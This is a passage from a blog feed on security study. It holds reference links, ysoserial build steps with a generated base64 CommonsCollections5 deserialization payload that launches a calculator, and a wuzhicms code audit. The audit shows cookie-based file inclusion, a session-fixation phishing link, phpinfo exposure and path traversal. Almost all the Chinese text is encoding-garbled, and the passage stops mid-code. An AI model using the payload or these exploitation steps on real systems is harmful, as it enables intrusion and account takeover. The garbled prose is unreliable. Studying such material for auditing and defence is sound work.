href="https://www.ruanyifeng.com/blog/2016/04/cors.html">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p><p>åˆè¯†HTTPå“åº”æ‹†åˆ†æ”»å‡»ï¼ˆCRLF Injectionï¼‰</p><p><a href="https://www.anquanke.com/post/id/240014">https://www.anquanke.com/post/id/240014</a></p><p>CSRFæ¼æ´åŸç†æ”»å‡»ä¸é˜²å¾¡ï¼ˆéå¸¸ç»†ï¼‰-CSDNåšå®¢</p><p><a href="https://blog.csdn.net/qq_43378996/article/details/123910614">https://blog.csdn.net/qq_43378996/article/details/123910614</a></p><p>JSONP è·¨åŸŸåŸç†åŠå®ç°</p><p><a href="https://segmentfault.com/a/1190000041946934">https://segmentfault.com/a/1190000041946934</a></p><p> PostgreSQL JDBC é©±åŠ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-21724ï¼‰</p><p><a href="https://avd.aliyun.com/detail?id=AVD-2022-21724&timestamp__1384=eqA27KD5BKAK4YqGNDQRhMiKvr+mCnCoD">https://avd.aliyun.com/detail?id=AVD-2022-21724&amp;timestamp__1384=eqA27KD5BKAK4YqGNDQRhMiKvr%2BmCnCoD</a></p><p>PreparedStatementçš„ä½¿ç”¨</p><p><a href="https://www.cnblogs.com/ysw-go/p/5459330.html">https://www.cnblogs.com/ysw-go/p/5459330.html</a></p><p>è·¯å¾„ç©¿è¶Šï¼ˆPath Traversalï¼‰è¯¦è§£-CSDNåšå®¢</p><p><a href="https://blog.csdn.net/qingzhantianxia/article/details/128204437">https://blog.csdn.net/qingzhantianxia/article/details/128204437</a></p><p>SSTIï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰æ¼æ´ï¼ˆå…¥é—¨ç¯‡ï¼‰</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p>SSRFæ¼æ´åŸç†æ”»å‡»ä¸é˜²å¾¡(è¶…è¯¦ç»†æ€»ç»“)-CSDNåšå®¢</p><p><a href="https://blog.csdn.net/qq_43378996/article/details/124050308">https://blog.csdn.net/qq_43378996/article/details/124050308</a></p><p>ç”±æµ…å…¥æ·±SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</p><p><a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a></p><p>XXEæ¼æ´åŸç†ã€æ£€æµ‹ä¸ä¿®å¤</p><p><a href="https://www.cnblogs.com/mysticbinary/p/12668547.html">https://www.cnblogs.com/mysticbinary/p/12668547.html</a></p><p>ä»XMLç›¸å…³ä¸€æ­¥ä¸€æ­¥åˆ°XXEæ¼æ´</p><p><a href="https://xz.aliyun.com/news/6483">https://xz.aliyun.com/news/6483</a></p><p>CVE-2020-26217 | XStreamè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ </p><p><a href="https://www.cnblogs.com/303donatello/p/13998245.html">https://www.cnblogs.com/303donatello/p/13998245.html</a></p><h1 id="å·¥å…·çš„å®‰è£…-ä½¿ç”¨"><a href="#å·¥å…·çš„å®‰è£…-ä½¿ç”¨" class="headerlink" title="å·¥å…·çš„å®‰è£…&amp;ä½¿ç”¨"></a>å·¥å…·çš„å®‰è£…&amp;ä½¿ç”¨</h1><h2 id="ysoserial-jar"><a href="#ysoserial-jar" class="headerlink" title="ysoserial.jar"></a>ysoserial.jar</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linuxï¼š<br><br>æ£€æŸ¥Javaç‰ˆæœ¬ï¼š<br>java -version<br>è‹¥æœªå®‰è£…ï¼š<br><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install openjdk-8-jdk-headless<br><br>å®‰è£… Git å’Œ Maven<br><span class="hljs-built_in">sudo</span> apt install git maven -y<br><br>æ‹‰å–æºç <br>git <span class="hljs-built_in">clone</span> https://github.com/frohoff/ysoserial.git<br><br>ç¼–è¯‘<br><span class="hljs-built_in">cd</span> ysoserial<br>mvn clean package -DskipTests<br><br>ç¼–è¯‘åæ‰€åœ¨æ–‡ä»¶å¤¹<br><span class="hljs-built_in">cd</span> target/ysoserial-0.0.6-SNAPSHOT-all.jar <br><br>é‡å‘½å<br><span class="hljs-built_in">cp</span> target/ysoserial-*-all.jar ~/ysoserial.jar<br><br>æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ<br>java -jar ysoserial.jar<br><br>ç”Ÿæˆpayload<br>calcWindows å†…ç½®å‘½ä»¤<br><span class="hljs-string">&quot;gnome-calculator&quot;</span>Linux + GUI + æœ‰æ­¤å‘½ä»¤<br><span class="hljs-string">&quot;open -a Calculator&quot;</span>macOS + å›¾å½¢ç¯å¢ƒ<br><br>Windowsï¼š<br><br>java -jar ~/ysoserial.jar CommonsCollections5 calc | <span class="hljs-built_in">base64</span><br><br>rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java é¶åœº</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wuzhicms ä»£ç å®¡è®¡</title>
    <link href="/2025/07/20/wuzhicms/"/>
    <url>/2025/07/20/wuzhicms/</url>
    
    <content type="html"><![CDATA[<h1 id="wuzhicms-ä»£ç å®¡è®¡"><a href="#wuzhicms-ä»£ç å®¡è®¡" class="headerlink" title="wuzhicms ä»£ç å®¡è®¡"></a>wuzhicms ä»£ç å®¡è®¡</h1><h1 id="æ ¹ç›®å½•åˆ†æ"><a href="#æ ¹ç›®å½•åˆ†æ" class="headerlink" title="æ ¹ç›®å½•åˆ†æ"></a>æ ¹ç›®å½•åˆ†æ</h1><p>apiAPIæ¥å£ï¼Œæ‰¾æœªæˆæƒã€SQLæ³¨å…¥<br>caches ç¼“å­˜ç›®å½•<br>configsé…ç½®æ–‡ä»¶<br>coreframeæ¡†æ¶æ ¸å¿ƒä»£ç <br>installå®‰è£…ç›®å½•ï¼Œå®‰è£…ååº”åˆ é™¤<br>map<br>promote<br>resé™æ€èµ„æº<br>uploadfileä¸Šä¼ æ–‡ä»¶å‚¨å­˜ç›®å½•ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´</p><h1 id="åˆ†æä»£ç -å‚è€ƒREADME-md"><a href="#åˆ†æä»£ç -å‚è€ƒREADME-md" class="headerlink" title="åˆ†æä»£ç (å‚è€ƒREADME.md)"></a>åˆ†æä»£ç (å‚è€ƒREADME.md)</h1><p>ç¨‹åºæ¨¡å—ç»“æ„è¯´æ˜</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">|<span class="hljs-string">-- coreframe                   #æ¡†æ¶ç›®å½•</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- app                     #æ¨¡å—ï¼ˆåº”ç”¨ç¨‹åºï¼‰ç›®å½•</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- affiche             #å…¬å‘Šæ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- appshop             #åº”ç”¨å•†åŸ</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- attachment          #é™„ä»¶æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- collect             #é‡‡é›†å™¨</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- content             #å†…å®¹æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- core                #æ ¸å¿ƒæ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- coupon              #ä¼˜æƒ åˆ¸æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- credit              #ç§¯åˆ†æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- database            #æ•°æ®åº“æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- dianping            #ç‚¹è¯„æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- guestbook           #ç•™è¨€æ¿æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- link                #å‹æƒ…é“¾æ¥æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- linkage             #è”åŠ¨èœå•</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- member              #ä¼šå‘˜æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- message             #ç«™å†…çŸ­ä¿¡æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- mobile              #ç§»åŠ¨æ‰‹æœºæ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- order               #è®¢å•æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- pay                 #æ”¯ä»˜æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- ppc                 #æ¨å¹¿æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- receipt             #å‘ç¥¨ç”³è¯·æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- search              #å…¨ç«™æœç´¢æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- sms                 #çŸ­ä¿¡æ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- tags                #tagsæ¨¡å—</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   --- template            #åœ¨çº¿æ¨¡æ¿ç¼–è¾‘</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- configs                 #æ¡†æ¶é…ç½®</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- core.php                #æ¡†æ¶å…¥å£</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- crontab                 #å®šæ—¶è„šæœ¬ç›®å½•</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- crontab.php             #å®šæ—¶è„šæœ¬å…¥å£</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- extend                  #æ‰©å±•ç›®å½•</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- languages               #è¯­è¨€åŒ…</span><br><span class="hljs-string"></span>|<span class="hljs-string">   --- templates               #æ¨¡æ¿</span><br><span class="hljs-string"></span>|<span class="hljs-string">-- caches                      #ç¼“å­˜ç›®å½•</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- _cache_                 #å…¬å…±ç¼“å­˜</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- block                   #åŒºå—ã€ç¢ç‰‡ç¼“å­˜</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- content                 #å†…å®¹æ¨¡å—ç¼“å­˜ï¼Œæ ç›®ç¼“å­˜</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- db_bak                  #æ•°æ®åº“å¤‡ä»½è·¯å¾„</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- install.check           #å®‰è£…é”å®š</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- model                   #æ¨¡å‹ç¼“å­˜</span><br><span class="hljs-string"></span>|<span class="hljs-string">   --- templates               #æ¨¡æ¿ç¼“å­˜</span><br><span class="hljs-string">--- www                         #ç½‘ç«™æ ¹ç›®å½•</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- 404.html                #404é¡µé¢</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- admin.php               #åå°å…¥å£</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- api                     #apiç›®å½•</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- configs                 #ç½‘ç«™é…ç½®</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- favicon.ico             #æµè§ˆå™¨icon</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- index.html              #ç½‘ç«™é¦–é¡µ</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- index.php               #åŠ¨æ€åœ°å€é¦–é¡µ</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- res                     #é™æ€èµ„æº</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- robots.txt              #æœç´¢å¼•æ“é˜²æŠ“å–è§„åˆ™</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- uploadfile              #é™„ä»¶</span><br><span class="hljs-string">    `-- web.php                 #è‡ªå®šä¹‰è·¯ç”±</span><br></code></pre></td></tr></table></figure><h2 id="app-æ¨¡å—ï¼ˆåº”ç”¨ç¨‹åºï¼‰ç›®å½•"><a href="#app-æ¨¡å—ï¼ˆåº”ç”¨ç¨‹åºï¼‰ç›®å½•" class="headerlink" title="app&#x2F; #æ¨¡å—ï¼ˆåº”ç”¨ç¨‹åºï¼‰ç›®å½•"></a>app&#x2F; #æ¨¡å—ï¼ˆåº”ç”¨ç¨‹åºï¼‰ç›®å½•</h2><p>å…ˆå»æ ¸å¿ƒæ¨¡å—çœ‹</p><h3 id="coreframe-app-core-admin-index-phpåå°ç™»å½•é¦–é¡µ"><a href="#coreframe-app-core-admin-index-phpåå°ç™»å½•é¦–é¡µ" class="headerlink" title="coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;index.phpåå°ç™»å½•é¦–é¡µ"></a>coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;index.phpåå°ç™»å½•é¦–é¡µ</h3><p>å› ä¸ºæ²¡æœ‰å¯¹$langè¿›è¡Œæ£€éªŒå’Œè¿‡æ»¤ï¼Œé€šè¿‡è®¾ç½®cookieå€¼ï¼Œå¯¹requireçš„è·¯å¾„æ‹¼æ¥ï¼Œä½¿requireæ‰§è¡Œä»»ä½•PHPæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$lang</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) ? <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) : LANG;<br><span class="hljs-keyword">require</span> COREFRAME_ROOT.<span class="hljs-string">&#x27;languages/&#x27;</span>.<span class="hljs-variable">$lang</span>.<span class="hljs-string">&#x27;/admin_menu.lang.php&#x27;</span>;<br>        <br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">left</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$lang</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) ? <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) : LANG;<br><span class="hljs-keyword">require</span> COREFRAME_ROOT.<span class="hljs-string">&#x27;languages/&#x27;</span>.<span class="hljs-variable">$lang</span>.<span class="hljs-string">&#x27;/admin_menu.lang.php&#x27;</span>;              <br></code></pre></td></tr></table></figure><p>æ­¤å¤„æ˜¯aiå‘ç°çš„ä¸€ä¸ªæ¼æ´ï¼Œå®é™…ä¸Šå¾ˆéš¾è§¦å‘ï¼Œè®°å½•ï¼š</p><ol><li>ç™»å½•æˆåŠŸåä¸ç”Ÿæˆæ–°session ID</li><li>ç›´æ¥é‡ç”¨æ”»å‡»è€…æä¾›çš„session ID</li></ol><p>åˆ©ç”¨ï¼š</p><ol><li>æ”»å‡»è€…è·å–è‡ªå·±çš„session IDï¼š<code>PHPSESSID=attacker_sess</code></li><li>æ„é€ é’“é±¼é“¾æ¥ï¼š</li></ol><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://target.com/admin/?m=core&amp;f=index&amp;v=login&amp;submit=1&amp;checkcode=...</span>[<span class="hljs-string">æœ‰æ•ˆéªŒè¯ç </span>]...&amp;username=admin&amp;password=123456<br></code></pre></td></tr></table></figure><ol><li>è¯±ä½¿ç®¡ç†å‘˜ç‚¹å‡»é“¾æ¥ï¼ˆå«æ”»å‡»è€…çš„session IDï¼‰</li><li>ç®¡ç†å‘˜ç™»å½•åï¼Œæ”»å‡»è€…ä½¿ç”¨ç›¸åŒçš„<code>PHPSESSID</code>å³å¯ç›´æ¥è¿›å…¥ç®¡ç†å‘˜è´¦æˆ·</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ç™»å½•</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//å·²ç»ç™»é™†çš„ç”¨æˆ·é‡å®šå‘åˆ°åå°é¦–é¡µ</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;already login&#x27;</span>), <span class="hljs-string">&#x27;?m=core&amp;f=index&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">su</span>(<span class="hljs-number">0</span>));<br>        &#125;<br>...<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æš´éœ²æ•æ„Ÿä¿¡æ¯ï¼šå½“ç„¶ï¼Œéœ€è¦ç™»å½•åˆ°åå°æ‰èƒ½åˆ©ç”¨ï¼Œæ‰€ä»¥ä¸ç®—é«˜å±ã€‚</p><p>è·¯ç”±ï¼š</p><p><code>http://wuzhicms:7575/index.php?m=core&amp;f=index&amp;_su=wuzhicms&amp;v=phpinfo</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ˜¾ç¤º phpinfo å†…å®¹</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">phpinfo</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080954694.png" alt="20250717125939730"></p><h3 id="coreframe-app-appupdate-admin-index-php"><a href="#coreframe-app-appupdate-admin-index-php" class="headerlink" title="coreframe&#x2F;app&#x2F;appupdate&#x2F;admin&#x2F;index.php"></a>coreframe&#x2F;app&#x2F;appupdate&#x2F;admin&#x2F;index.php</h3><p>å¦‚æœ $filePath ä¸º ..&#x2F;..&#x2F;..&#x2F;index.phpï¼Œåˆ™ COREFRAME_ROOT . â€˜..&#x2F;..&#x2F;..&#x2F;index.phpâ€™ å°±å¯ä»¥æŒ‡å‘ç³»ç»Ÿç›®å½•å¤–çš„æ•æ„Ÿæ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_deleteFilesForPackageUpdate</span>(<span class="hljs-params"><span 